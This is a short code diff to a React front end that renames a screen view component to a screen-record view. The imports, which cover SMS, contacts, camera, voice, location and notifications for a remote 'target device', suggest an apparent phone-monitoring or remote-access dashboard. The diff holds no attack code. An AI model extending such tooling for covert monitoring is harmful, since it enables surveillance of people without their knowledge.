@@ -16,7 +16,7 @@ import GalleryView from "@/components/views/GalleryView";
 import SmsView from "@/components/views/SmsView";
 import ContactsView from "@/components/views/ContactsView";
 import CameraView from "@/components/views/CameraView";
-import ScreenView from "@/components/views/ScreenView";
+import ScreenRecordView from "@/components/views/ScreenRecordView";
 import VoiceView from "@/components/views/VoiceView";
 import LocationView from "@/components/views/LocationView";
 import NotificationsView from "@/components/views/NotificationsView";
@@ -2685,7 +2685,7 @@ END:VCARD`;
                 const isOnline = !!targetDevObj?.online;
                 const devName = targetDevObj ? getCleanDeviceName(targetDevObj) : undefined;
                 return (
-                    <ScreenView
+                    <ScreenRecordView
                         socket={socket}
                         userUuid={userUuid}
                         selectedDeviceId={effectiveTargetDevice}
